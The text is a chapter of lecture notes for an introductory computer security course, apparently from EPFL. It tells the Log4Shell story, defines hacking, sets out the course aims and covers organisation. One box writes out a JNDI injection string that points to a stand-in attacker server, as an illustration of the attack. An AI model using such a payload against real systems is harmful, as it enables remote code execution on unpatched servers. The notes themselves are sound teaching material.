% =========================================================
\chapter{Lecture 0 : Preliminaries}
% =========================================================

\begin{rembox}[title=In a nutshell]
\textbf{What is this lecture about?} Why the course exists, told through one real disaster
(\textbf{Log4Shell}, 2021), what ``hacking'' means, what the course aims at (principles that
outlast technology, \textbf{adversarial thinking}, a toolbox of mechanisms) and how it is
organised. \\
\textbf{Why is it useful?} It sets the attitude of the whole course: always ask ``how can this be
made to fail?'', not only ``how can this be made to work?''.
\end{rembox}

\section{An introductory story: Log4Shell}

\begin{exbox}[title={Log4j and JNDI}]
\textbf{Log4j} is a very popular Java logging library: applications use it to record user
logins, errors, system events, debug information. It is in millions of applications, from
Minecraft to the cloud services of Apple, Amazon and Google. It can expand placeholders in the
logged text, e.g.\ \texttt{log.info("Running on Java version: \$\{java:version\}.")}. \\
\textbf{JNDI} is a Java service that distributes serialized objects \emph{and code}. Log4j
supported JNDI lookups inside log messages, e.g.\ \texttt{\$\{jndi:ldap://epfl.ch/statusJava\}}:
the logger fetches an object from a remote server while logging.
\end{exbox}

\begin{exbox}[title={The attack (CVE-2021-44228, ``Log4Shell'', 10 December 2021)}]
A chat server logs the messages of its users: \texttt{logger.debug("User \{\} sent message
\{\}", user, message)}. A user sends the message
\texttt{\$\{jndi:ldap://myAttackerServer.ch/anAttackerObject\}}. While \emph{logging} it, the
server contacts the attacker's server, downloads the attacker's object and runs its code:
\textbf{remote code execution} from a chat message. \\
Severity score \textbf{10.0 / 10}. Attack surface: nearly every major organisation. Consequences:
ransomware, cryptocurrency miners, theft of data and credentials, persistent backdoors. A global
scramble to patch.
\end{exbox}

\begin{propbox}[title=Lessons learned]
\begin{itemize}
  \item The obvious one: \textbf{sanitize user inputs} (see sanitization, Lecture 4).
  \item \textbf{Software supply chain security}: you are vulnerable to the flaws of the software
        you use.
  \item \textbf{Software Bill of Materials (SBOM)}: know exactly which components are in your
        software --- you cannot patch what you do not know you have.
  \item \textbf{Defence in depth}: a single flaw can bypass defences; several layers are needed
        (Lecture 1).
  \item \textbf{Default configurations matter}: dangerous features should be disabled by default
        (fail-safe defaults, Lecture 2).
  \item Security requires communication: vulnerabilities are published as \textbf{CVEs}
        (Common Vulnerabilities and Exposures).
\end{itemize}
\end{propbox}

\begin{goatbox}
A logging library is a notebook where a program writes what happens. Log4j's notebook had a
magic feature: some words written in it were ``instructions to go fetch something''. So a
stranger only had to \emph{say} those words in a chat for the server to write them down, go fetch
the stranger's package, and open it. Nobody had thought that writing in a notebook could be
dangerous.
\end{goatbox}

\section{What hacking is, and what this course is about}

\begin{defnbox}[title=Two views of hacking]
\begin{itemize}
  \item \textbf{Hacking as ``breaking things''} (the common view): exploiting vulnerabilities for
        unauthorized access or malicious intent. The course studies it a little, to understand
        the attacker's methods and build effective defences.
  \item \textbf{Hacking as ``creative problem solving''} (the original MIT definition): finding
        clever, elegant, often unintended solutions or uses of a system, from a deep
        understanding of it. The course embraces this spirit to study the security of systems.
\end{itemize}
\textbf{Not} the purpose: a ``how-to-hack'' course, advanced exploitation, CTF training (join the
EPFL CTF team for that).
\end{defnbox}

\begin{defnbox}[title=The three aims of the course]
\begin{enumerate}
  \item Understand the \textbf{basic concepts and principles} of security design and engineering,
        which will outlast current technology.
  \item Learn to \textbf{model threats} and think critically about security problems:
        \textbf{adversarial thinking}.
  \item Get familiar with \textbf{security mechanisms}, their purpose and their limitations: a
        \textbf{toolbox} for security engineering (know the tools, evaluate their pros and cons
        in a scenario, know where to search further).
\end{enumerate}
Topics: principles, access control, applied cryptography, authentication, attacks and malware,
software security, web \& network security, privacy.
\end{defnbox}

\begin{exbox}[title={The security mindset: ``Keep the change'' (Bank of America)}]
If you buy something for $X$ dollars and $Y$ cents, the bank charges you $X+1$ and puts $1-Y$ in
your savings account (a coffee at \$2.75: charged \$3, \$0.25 saved). The first three months, the
bank does not charge the $+1$, it only adds the cents to the savings. \textbf{What can go wrong?}
(The slides leave the question open; one answer:) buy many tiny things priced \$X.01 during the first three months: each gives you \$0.99 of free
savings. \\
``Good engineering involves thinking about how things can be made to work; the security mindset
involves thinking about how things can be made to fail.'' (Bruce Schneier)
\end{exbox}

\begin{goatbox}
A normal engineer asks ``does my fence keep the goats in?''. A security engineer asks ``if I were
a very clever goat who \emph{wants} to get out, where would I push?''. This course trains you to
be that clever goat, so that you build better fences.
\end{goatbox}

\section{Organisation}

\begin{rembox}[title=Course organisation]
\begin{itemize}
  \item Lectures on Thursday morning, interleaved with problem solving; exercise sessions
        (programming homework Q\&A, theory exercises, practice problem sets).
  \item \textbf{5 graded programming assignments}, done \textbf{individually}, in Python, on Linux
        with root access (own machine or the COM-301 VM).
  \item \textbf{Mid-term} (Tuesday Nov 3, 2026) and \textbf{final} (January 2027): closed book,
        only a cheat sheet.
  \item \textbf{Grade} $= 80\%$ final $+ 10\%$ assignments $+ 10\%$ mid-term. You are never
        graded in lectures, exercises or on the forum (EdStem): ask questions.
  \item Books: Gollmann \emph{Computer Security}, Anderson \emph{Security Engineering}, Stallings
        \& Brown \emph{Computer Security: Principles and Practice}. Read the news to train your
        adversarial thinking.
\end{itemize}
(Joke of the slides: ``Moodle restrictions are not an actual access control mechanism''.)
\end{rembox}

\begin{recapbox}[title={Exam-ready recap --- Lecture 0: Preliminaries}]
\begin{itemize}
  \item \textbf{Log4Shell} (CVE-2021-44228, score 10/10): Log4j expanded \texttt{\$\{jndi:\ldots\}}
        in logged text, so a logged user message made the server download and run the
        attacker's code. Lessons: sanitize inputs, supply chain security, SBOM, defence in depth,
        safe defaults.
  \item \textbf{Hacking}: breaking things vs.\ creative problem solving (original MIT meaning).
  \item \textbf{Aims}: lasting principles, \textbf{adversarial thinking} (``how can it be made to
        fail?''), a toolbox of mechanisms with their limits.
  \item Grade: 80\% final, 10\% assignments, 10\% mid-term; exams closed book with a cheat sheet.
\end{itemize}
\textbf{How it builds on what came before}: this is the starting point. Every later chapter is an
answer to the Log4Shell question: what must hold (policy), against whom (threat model), with what
(mechanisms), and how to design them so that one forgotten detail does not break everything.
\end{recapbox}
